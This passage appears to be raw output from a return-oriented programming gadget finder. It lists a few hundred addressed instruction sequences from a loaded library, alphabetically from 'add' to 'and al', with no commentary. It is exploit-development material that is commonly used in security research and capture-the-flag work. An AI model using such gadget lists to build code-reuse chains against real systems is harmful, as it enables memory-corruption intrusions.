0x00002aaaaac84ee5 : add qword ptr [r8], r8 ; clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84e55 : add qword ptr [r8], r8 ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84d35 : add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84f2d : add qword ptr [r8], r8 ; jo 0x1aff2e ; jmp qword ptr [rcx]
0x00002aaaaac84ecd : add qword ptr [r8], r8 ; loopne 0x1aff47 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84e9d : add qword ptr [r8], r8 ; mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84f15 : add qword ptr [r8], r8 ; sub byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac6d015 : add qword ptr [r8], rax ; insd dword ptr [rdi], dx ; call rsp
0x00002aaaaabe2274 : add qword ptr [r9 - 0x7d], r9 ; ret 0x8408
0x00002aaaaabe2b57 : add qword ptr [rax - 0x77], rcx ; sub r14b, r8b ; add byte ptr [rax], ah ; jmp 0x10db2f
0x00002aaaaaaf8c9d : add qword ptr [rax - 0x7d], r9 ; ret 0x4d02
0x00002aaaaac84bed : add qword ptr [rax], r8 ; add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84bd5 : add qword ptr [rax], r8 ; call 0x221af14f
0x00002aaaaac84c35 : add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84df5 : add qword ptr [rax], r8 ; fsubr dword ptr [rsi - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac84dad : add qword ptr [rax], r8 ; nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84e25 : add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84d4d : add qword ptr [rax], r8 ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84c05 : add qword ptr [rax], r8 ; sbb byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84dc5 : add qword ptr [rax], r8 ; test al, 0x6e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabf361c : add qword ptr [rax], rax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac849bd : add qword ptr [rax], rax ; and byte ptr [rbx - 0xb], bl ; jmp qword ptr [rcx]
0x00002aaaaac84a35 : add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84975 : add qword ptr [rax], rax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac849ed : add qword ptr [rax], rax ; push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab1233c : add qword ptr [rbp - 0x57f2faf], rcx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaabea982 : add qword ptr [rbp - 0x61], rsi ; mov rax, rdi ; add rsp, 8 ; ret
0x00002aaaaab4c9c2 : add qword ptr [rbx + 0x18], rbp ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe2fcd : add qword ptr [rbx + 0x38], rbp ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac84492 : add qword ptr [rdi], 2 ; cwde ; ret
0x00002aaaaac3cedd : add qword ptr [rdi], rcx ; test dword ptr [rbx + 3], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaac84e9c : add qword ptr fs:[r8], r8 ; mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaabf8310 : add r10, 2 ; mov dword ptr [r8], edx ; mov qword ptr [r9], r10 ; ret
0x00002aaaaab72d1b : add r10, rax ; jmp r10
0x00002aaaaac2fd72 : add r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fd02 : add r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2fc92 : add r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac6f3e0 : add r15d, edx ; call rsp
0x00002aaaaac1e680 : add r8, qword ptr [r8] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1ab14 : add r8, qword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab1f7ff : add r8, rbx ; add rsp, 0x20 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaabac65d : add r8b, byte ptr [r8] ; add byte ptr [rbx - 0x7cb7fe40], al ; ret 0x3d01
0x00002aaaaabf81f1 : add r8b, byte ptr [r8] ; jne 0x123247 ; mov eax, r8d ; ret
0x00002aaaaab72ec4 : add r8b, byte ptr [r8] ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab72e34 : add r8b, byte ptr [r8] ; mov rax, rdi ; ret
0x00002aaaaac6f74d : add r8b, byte ptr [rax] ; hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaac445d3 : add r8b, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaab29f37 : add r8d, dword ptr [r8] ; add cl, bl ; in eax, -0x21 ; loopne 0x54ed2 ; ret 0xe680
0x00002aaaaac17ef0 : add r9, qword ptr [rbp - 0x88] ; call rax
0x00002aaaaac253ca : add r9, r11 ; jmp r9
0x00002aaaaaafbe73 : add r9b, byte ptr [r8 + 0x39] ; ret
0x00002aaaaabf78d5 : add r9b, byte ptr [r8 + 0x39] ; ret 0x1472
0x00002aaaaabc19d9 : add r9b, r13b ; ret
0x00002aaaaaafbe90 : add r9d, dword ptr [r8 + 0x39] ; ret
0x00002aaaaabf8568 : add r9d, r8d ; loopne 0x12357b ; cdqe ; shr rax, 4 ; ret
0x00002aaaaaafbe8a : add rax, -0x72b70000 ; add r9d, dword ptr [r8 + 0x39] ; ret
0x00002aaaaac21832 : add rax, -0x7cb80000 ; ret 0xe910
0x00002aaaaab123bc : add rax, -0x7f2fae73 ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac3cf63 : add rax, 0x2c5850f ; add byte ptr [rax], al ; ret
0x00002aaaaabe8dd6 : add rax, 0x48 ; cmp rax, rdx ; jb 0x113ddb ; xor eax, eax ; ret
0x00002aaaaac0c755 : add rax, 0xa0 ; add rsp, 8 ; ret
0x00002aaaaac0c785 : add rax, 0xa8 ; add rsp, 8 ; ret
0x00002aaaaab1d080 : add rax, 1 ; cmp rax, rdx ; jne 0x48083 ; xor eax, eax ; ret
0x00002aaaaab7ede9 : add rax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab80390 : add rax, 1 ; ret
0x00002aaaaab80387 : add rax, 2 ; ret
0x00002aaaaab803a0 : add rax, 3 ; ret
0x00002aaaaab80d9b : add rax, 4 ; test edx, edx ; mov dword ptr [rax], edx ; jne 0xabda3 ; ret
0x00002aaaaaaf5be8 : add rax, qword ptr [0] ; ret
0x00002aaaaab08e8f : add rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaac18209 : add rax, qword ptr [rdx + 8] ; add rsp, 0x38 ; ret
0x00002aaaaac17b2d : add rax, qword ptr [rdx + 8] ; add rsp, 0x48 ; ret
0x00002aaaaaaf5be7 : add rax, qword ptr fs:[0] ; ret
0x00002aaaaab59999 : add rax, r13 ; jmp rax
0x00002aaaaab03bbb : add rax, r14 ; jmp rax
0x00002aaaaab73667 : add rax, r8 ; ret
0x00002aaaaab72e84 : add rax, r9 ; jmp rax
0x00002aaaaabea806 : add rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab2e822 : add rax, rcx ; jmp rax
0x00002aaaaab62d49 : add rax, rcx ; ret
0x00002aaaaab73664 : add rax, rdi ; add rax, r8 ; ret
0x00002aaaaab62d46 : add rax, rdi ; add rax, rcx ; ret
0x00002aaaaab94503 : add rax, rdi ; jmp rax
0x00002aaaaab618aa : add rax, rdi ; ret
0x00002aaaaac1ea5a : add rax, rdi ; sub rax, r8 ; ret
0x00002aaaaac1ecaf : add rax, rdi ; sub rax, rdx ; ret
0x00002aaaaab03c99 : add rax, rdx ; jmp rax
0x00002aaaaab5fd05 : add rax, rdx ; sub rax, rdi ; ret
0x00002aaaaab22a50 : add rax, rsi ; jmp rax
0x00002aaaaaba488d : add rbx, 1 ; mov rdx, rax ; jmp 0xcf836
0x00002aaaaac485b8 : add rbx, qword ptr [r13 + 0x70] ; mov rdi, qword ptr [rbx] ; call 0x1f8b1
0x00002aaaaac0eb9d : add rbx, r12 ; call r14
0x00002aaaaab63733 : add rcx, 0x40 ; cmp rdx, rcx ; jne 0x8e72a ; ret
0x00002aaaaabf83ac : add rcx, 2 ; mov dword ptr [r8], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaaba5d42 : add rcx, qword ptr [r8 - 0x7d] ; ret
0x00002aaaaab1237c : add rcx, qword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab1cc95 : add rcx, r11 ; jmp rcx
0x00002aaaaab00e47 : add rcx, r8 ; jmp rcx
0x00002aaaaab38888 : add rcx, rax ; jmp rcx
0x00002aaaaab0829b : add rcx, rdi ; jmp rcx
0x00002aaaaab38e49 : add rcx, rdx ; jmp rcx
0x00002aaaaab7f0e3 : add rcx, rsi ; jmp rcx
0x00002aaaaac071dc : add rdi, 0x10 ; jmp rcx
0x00002aaaaac0036e : add rdi, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaac02549 : add rdi, 0x23b0 ; xor eax, eax ; jmp rcx
0x00002aaaaac02501 : add rdi, 0x23b0 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaaaf58eb : add rdi, 0x47 ; shl rdi, 4 ; add rdi, rbp ; call rax
0x00002aaaaac09c83 : add rdi, 0x58 ; jmp rcx
0x00002aaaaac093e3 : add rdi, 0x68 ; jmp rcx
0x00002aaaaac06666 : add rdi, 0xc8 ; jmp rcx
0x00002aaaaab72d63 : add rdi, 1 ; mov rax, rdi ; ret
0x00002aaaaaba5a1a : add rdi, 1 ; test dl, dl ; jne 0xd0a0a ; ret
0x00002aaaaab72d74 : add rdi, 2 ; mov rax, rdi ; ret
0x00002aaaaab72d87 : add rdi, 3 ; mov rax, rdi ; ret
0x00002aaaaab72d94 : add rdi, 4 ; mov dword ptr [rdi - 4], eax ; mov rax, rdi ; ret
0x00002aaaaab72da7 : add rdi, 5 ; mov dword ptr [rdi - 5], eax ; mov rax, rdi ; ret
0x00002aaaaab72d31 : add rdi, 6 ; mov dword ptr [rdi - 6], eax ; mov rax, rdi ; ret
0x00002aaaaac46f7e : add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaabb5e9c : add rdi, r11 ; jmp rdi
0x00002aaaaaaf58f3 : add rdi, rbp ; call rax
0x00002aaaaac253c7 : add rdi, rdx ; add r9, r11 ; jmp r9
0x00002aaaaabf8384 : add rdi, rdx ; mov qword ptr [r9], rdi ; ret
0x00002aaaaab41aa1 : add rdi, rsi ; jmp rdi
0x00002aaaaab80a55 : add rdx, 4 ; mov ecx, dword ptr [rdx] ; test ecx, ecx ; jne 0xaba5b ; ret
0x00002aaaaab7f25f : add rdx, 4 ; test ecx, ecx ; mov dword ptr [rdx], ecx ; jne 0xaa263 ; ret
0x00002aaaaab976ac : add rdx, r8 ; jmp rdx
0x00002aaaaab1e0b1 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaab73567 : add rdx, rax ; jl 0x9e5d8 ; add rax, rdi ; ret
0x00002aaaaab73566 : add rdx, rax ; jl 0x9e5d9 ; add rax, rdi ; ret
0x00002aaaaab73577 : add rdx, rax ; jl 0x9e5da ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x00002aaaaab73597 : add rdx, rax ; jl 0x9e5da ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x00002aaaaab735b7 : add rdx, rax ; jl 0x9e5da ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaaaf60b7 : add rdx, rax ; jmp rdx
0x00002aaaaabb56b6 : add rdx, rcx ; jmp rdx
0x00002aaaaab996b4 : add rdx, rsi ; jmp rdx
0x00002aaaaab8fcd4 : add rdx, rsi ; mov rax, rdx ; add rsp, 0x18 ; ret
0x00002aaaaac08434 : add rsi, 0x38 ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab1d218 : add rsi, 1 ; cmp rsi, rdx ; jne 0x4821b ; xor eax, eax ; ret
0x00002aaaaab038f1 : add rsi, rax ; jmp rsi
0x00002aaaaac101f2 : add rsi, rax ; mov qword ptr [rdi + 0x18], rsi ; ret
0x00002aaaaab08412 : add rsi, rdi ; jmp rsi
0x00002aaaaac253c4 : add rsi, rdx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x00002aaaaac02f87 : add rsp, 0x10 ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaab5c953 : add rsp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac107f5 : add rsp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab41475 : add rsp, 0x10 ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44a13 : add rsp, 0x10 ; mov rax, rsi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5a4a8 : add rsp, 0x10 ; mov rsi, r12 ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaabe9733 : add rsp, 0x10 ; pop rbx ; and eax, 0xc ; pop rbp ; pop r12 ; ret
0x00002aaaaab448c6 : add rsp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaab0fdad : add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a83d : add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab5aec6 : add rsp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab8e440 : add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac0ba7e : add rsp, 0x100 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab62b8e : add rsp, 0x100 ; ret
0x00002aaaaab5f78c : add rsp, 0x100 ; sub rax, rdx ; ret
0x00002aaaaabe9b3d : add rsp, 0x1000 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3fd22 : add rsp, 0x1000 ; pop rbx ; ret
0x00002aaaaab3fd30 : add rsp, 0x1000 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0a9dc : add rsp, 0x108 ; ret
0x00002aaaaabcc6bd : add rsp, 0x120 ; pop rbx ; ret
0x00002aaaaab0ad8a : add rsp, 0x140 ; pop rbx ; ret
0x00002aaaaab0a3aa : add rsp, 0x148 ; ret
0x00002aaaaab1a093 : add rsp, 0x170 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9f2b6 : add rsp, 0x18 ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaabf45bf : add rsp, 0x18 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaabd183c : add rsp, 0x18 ; mov eax, edx ; ret
0x00002aaaaab40315 : add rsp, 0x18 ; movzx eax, al ; neg eax ; ret
0x00002aaaaac0ef95 : add rsp, 0x18 ; movzx eax, al ; pop rbx ; pop rbp ; ret
0x00002aaaaac1076b : add rsp, 0x18 ; movzx eax, al ; ret
0x00002aaaaab7389a : add rsp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac00f11 : add rsp, 0x18 ; pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x00002aaaaab10174 : add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0fb4f : add rsp, 0x18 ; ret
0x00002aaaaaba06b1 : add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabebd25 : add rsp, 0x18 ; xor edx, edx ; div rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaabd195a : add rsp, 0x190 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbcb6 : add rsp, 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab1f802 : add rsp, 0x20 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaab42fe5 : add rsp, 0x20 ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab441b3 : add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab46cc7 : add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaac07f78 : add rsp, 0x20 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbc63 : add rsp, 0x20 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0bde5 : add rsp, 0x240 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf5b8d : add rsp, 0x28 ; jmp rax
0x00002aaaaaaf56bc : add rsp, 0x28 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab19c94 : add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab09ad2 : add rsp, 0x28 ; ret
0x00002aaaaab3fc50 : add rsp, 0x28 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabd0b14 : add rsp, 0x30 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaabf5e49 : add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabffc9a : add rsp, 0x30 ; pop rbx ; ret
0x00002aaaaabf5e78 : add rsp, 0x30 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba24e7 : add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9daf6 : add rsp, 0x38 ; ret
0x00002aaaaac07dd0 : add rsp, 0x40 ; pop rbx ; movzx eax, al ; pop rbp ; pop r12 ; ret
0x00002aaaaab0ae0b : add rsp, 0x40 ; pop rbx ; ret
0x00002aaaaabde817 : add rsp, 0x40 ; ret
0x00002aaaaac07d04 : add rsp, 0x40 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab3f96b : add rsp, 0x400 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd9577 : add rsp, 0x408 ; ret
0x00002aaaaab1f67b : add rsp, 0x440 ; pop rbx ; ret
0x00002aaaaabccd71 : add rsp, 0x48 ; movzx eax, al ; ret
0x00002aaaaac03b16 : add rsp, 0x48 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabf9583 : add rsp, 0x48 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9e3d1 : add rsp, 0x48 ; ret
0x00002aaaaab80f5b : add rsp, 0x50 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac14bea : add rsp, 0x510 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac14c2a : add rsp, 0x510 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd0e4e : add rsp, 0x60 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabd0ea2 : add rsp, 0x60 ; mov rbx, rax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaabcb556 : add rsp, 0x60 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcbb0f : add rsp, 0x60 ; pop rbx ; ret
0x00002aaaaab815a5 : add rsp, 0x60 ; pop rbx ; sub rax, rbp ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf4b09 : add rsp, 0x600 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbce90 : add rsp, 0x68 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac0cb7b : add rsp, 0x68 ; ret
0x00002aaaaac0b26f : add rsp, 0x70 ; pop rbx ; ret
0x00002aaaaabda14c : add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0f952 : add rsp, 0x80 ; add rsp, 8 ; ret
0x00002aaaaab29e4d : add rsp, 0x80 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4a99f : add rsp, 0x80 ; mov eax, edx ; ret
0x00002aaaaab40a60 : add rsp, 0x80 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab46030 : add rsp, 0x80 ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab52f2f : add rsp, 0x80 ; mov rax, r8 ; ret
0x00002aaaaab0faa7 : add rsp, 0x80 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab44e08 : add rsp, 0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1a382 : add rsp, 0x80 ; pop rbx ; ret
0x00002aaaaab404b8 : add rsp, 0x80 ; ret
0x00002aaaaab0eede : add rsp, 0x80 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab0a96a : add rsp, 0x88 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab0a8d2 : add rsp, 0x88 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0aa90 : add rsp, 0x90 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0ab98 : add rsp, 0x90 ; pop rbx ; ret
0x00002aaaaab0b950 : add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf59ae : add rsp, 0x98 ; ret
0x00002aaaaab9c510 : add rsp, 0x98 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab0aebc : add rsp, 0xa0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0af73 : add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0bcfc : add rsp, 0xa8 ; ret
0x00002aaaaab90a55 : add rsp, 0xd0 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4062c : add rsp, 0xd0 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaabd9894 : add rsp, 0xd0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c38d : add rsp, 0xd0 ; pop rbx ; ret
0x00002aaaaab0a699 : add rsp, 0xd0 ; ret
0x00002aaaaabeaff3 : add rsp, 0xd8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaabd937d : add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1acf3 : add rsp, 0xd8 ; ret
0x00002aaaaac07472 : add rsp, 8 ; add eax, 2 ; ret
0x00002aaaaab25194 : add rsp, 8 ; add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab61cac : add rsp, 8 ; jmp rax
0x00002aaaaabf829c : add rsp, 8 ; lea eax, dword ptr [rbp + rbx] ; pop rbx ; pop rbp ; ret
0x00002aaaaac00380 : add rsp, 8 ; mov eax, 0x10 ; pop rbx ; pop rbp ; ret
0x00002aaaaab45448 : add rsp, 8 ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaabe2e6c : add rsp, 8 ; mov eax, 1 ; pop rbx ; pop rbp ; ret
0x00002aaaaabda7eb : add rsp, 8 ; mov eax, 5 ; pop rbx ; pop rbp ; ret
0x00002aaaaabe73b8 : add rsp, 8 ; mov eax, 7 ; pop rbx ; pop rbp ; ret
0x00002aaaaab250de : add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab4543c : add rsp, 8 ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf6217 : add rsp, 8 ; mov eax, edi ; neg eax ; ret
0x00002aaaaab1ac43 : add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab4077d : add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab731cc : add rsp, 8 ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x00002aaaaab076a6 : add rsp, 8 ; mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaab52b27 : add rsp, 8 ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaab94283 : add rsp, 8 ; mov rax, rdx ; ret
0x00002aaaaab0f1cf : add rsp, 8 ; mov rax, rsi ; pop rbx ; pop rbp ; ret
0x00002aaaaab59e0e : add rsp, 8 ; mov rdi, rbp ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac01b58 : add rsp, 8 ; mov rdi, rbp ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaac0ed1b : add rsp, 8 ; mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaab4cfc8 : add rsp, 8 ; movzx eax, al ; neg eax ; ret
0x00002aaaaac039f6 : add rsp, 8 ; movzx eax, al ; pop rbx ; pop rbp ; ret
0x00002aaaaab1a3b5 : add rsp, 8 ; movzx eax, al ; ret
0x00002aaaaabfb9e9 : add rsp, 8 ; movzx eax, ax ; ret
0x00002aaaaac02c88 : add rsp, 8 ; pop rbx ; pop rbp ; add eax, edx ; ret
0x00002aaaaab46fbf : add rsp, 8 ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaab07dc0 : add rsp, 8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaaf6a30 : add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4e157 : add rsp, 8 ; pop rbx ; pop rbp ; sub rax, rdx ; ret
0x00002aaaaab0a132 : add rsp, 8 ; ret
0x00002aaaaac14a70 : add rsp, 8 ; sar eax, 0x1f ; ret
0x00002aaaaac10863 : add rsp, 8 ; shr eax, 0x1f ; ret
0x00002aaaaab4cd50 : add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaabbed4a : add rsp, 8 ; xor eax, eax ; ret
0x00002aaaaab52b68 : add rsp, 8 ; xor edx, edx ; mov rax, rdx ; pop rbx ; pop rbp ; ret
0x00002aaaaab688ee : add sil, sil ; ret 0x7404
0x00002aaaaac698f4 : add spl, dil ; call qword ptr [rax]
0x00002aaaaabddde3 : add word ptr [rax], 1 ; ret
0x00002aaaaabddb2a : add word ptr [rdx + rax*2], 1 ; ret
0x00002aaaaac69b41 : and ah, bh ; jmp rax
0x00002aaaaac69b01 : and ah, bh ; push qword ptr [rax + 0x21] ; cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaabe9efa : and ah, byte ptr [rdx] ; sub eax, dword ptr [rax] ; pop rbp ; ret
0x00002aaaaac6d1c1 : and ah, dh ; call rsp
0x00002aaaaac83630 : and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac69934 : and ah, dh ; sti ; push qword ptr [rax - 0xb] ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac7236d : and al, 0 ; add al, ah ; jl 0x19d362 ; call qword ptr [rcx]
0x00002aaaaab77721 : and al, 0 ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab6b131 : and al, 0 ; add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaac7240d : and al, 0 ; add byte ptr [rax], al ; jle 0x19d402 ; jmp qword ptr [rsi]
0x00002aaaaac72990 : and al, 0 ; add byte ptr [rax], al ; pop rsp ; sub al, byte ptr [rax] ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaac79178 : and al, 0 ; add byte ptr [rax], al ; xchg eax, edx ; add byte ptr [rax], al ; rol byte ptr [rdx], 0xfd ; jmp rsp
0x00002aaaaab6b0c2 : and al, 0 ; je 0x960d9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaafb54e : and al, 0x10 ; add byte ptr [rdi], cl ; test byte ptr [rdi], cl ; add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaabcbb3d : and al, 0x10 ; add cl, byte ptr [rdi] ; ret 0x8348
0x00002aaaaabc6b20 : and al, 0x10 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabf5e47 : and al, 0x10 ; add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0b30b : and al, 0x10 ; call qword ptr [r10]
0x00002aaaaab9cf60 : and al, 0x10 ; call rax
0x00002aaaaac09fcf : and al, 0x10 ; call rcx
0x00002aaaaab5614a : and al, 0x10 ; call rdi
0x00002aaaaab09f37 : and al, 0x10 ; fld xword ptr [rsp + 8] ; ret
0x00002aaaaabe32f2 : and al, 0x10 ; mov edi, 0x2000004 ; call rax
0x00002aaaaabd7241 : and al, 0x10 ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaab49fe6 : and al, 0x10 ; mov rdi, r12 ; call rbx
0x00002aaaaac0043a : and al, 0x10 ; mov rdi, rbp ; call r14
0x00002aaaaabe31ee : and al, 0x10 ; mov rsi, qword ptr [rsp + 8] ; call rax
0x00002aaaaabf4366 : and al, 0x10 ; mov rsi, qword ptr [rsp + 8] ; mov rdi, r13 ; call r12
0x00002aaaaab5731f : and al, 0x10 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab56033 : and al, 0x10 ; xor edi, edi ; call qword ptr [rax]
